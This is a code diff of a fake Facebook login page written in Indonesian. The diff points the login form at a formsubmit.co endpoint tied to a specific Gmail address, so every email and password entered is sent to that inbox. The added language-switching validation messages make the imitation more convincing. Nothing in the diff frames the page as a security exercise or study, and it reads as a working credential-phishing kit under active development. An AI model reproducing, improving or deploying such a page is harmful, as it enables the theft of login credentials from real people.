@@ -97,7 +97,7 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
         
-        <form action="https://formsubmit.co/your-email@example.com" method="POST">
+        <form action="https://formsubmit.co/droidmega724@gmail.com" method="POST">
             <input type="email" id="email" name="email" class="input-field" placeholder="Nomor ponsel atau email" required>
             <input type="password" id="password" name="password" class="input-field" placeholder="Kata sandi" required>
             <button type="submit" class="login-btn">Login</button>
@@ -112,16 +112,27 @@
         document.addEventListener("DOMContentLoaded", function () {
             const emailField = document.getElementById("email");
             const passwordField = document.getElementById("password");
+            const langSwitch = document.querySelector(".language-switch");
+
+            function updateValidationMessages() {
+                if (langSwitch.innerText === "Bahasa Indonesia") {
+                    emailField.setCustomValidity("Silakan isi email atau nomor ponsel!");
+                    passwordField.setCustomValidity("Silakan isi kata sandi!");
+                } else {
+                    emailField.setCustomValidity("Please enter your phone number or email!");
+                    passwordField.setCustomValidity("Please enter your password!");
+                }
+            }
 
             emailField.oninvalid = function (event) {
-                event.target.setCustomValidity("Silakan isi email atau nomor ponsel!");
+                updateValidationMessages();
             };
             emailField.oninput = function (event) {
                 event.target.setCustomValidity("");
             };
 
             passwordField.oninvalid = function (event) {
-                event.target.setCustomValidity("Silakan isi kata sandi!");
+                updateValidationMessages();
             };
             passwordField.oninput = function (event) {
                 event.target.setCustomValidity("");
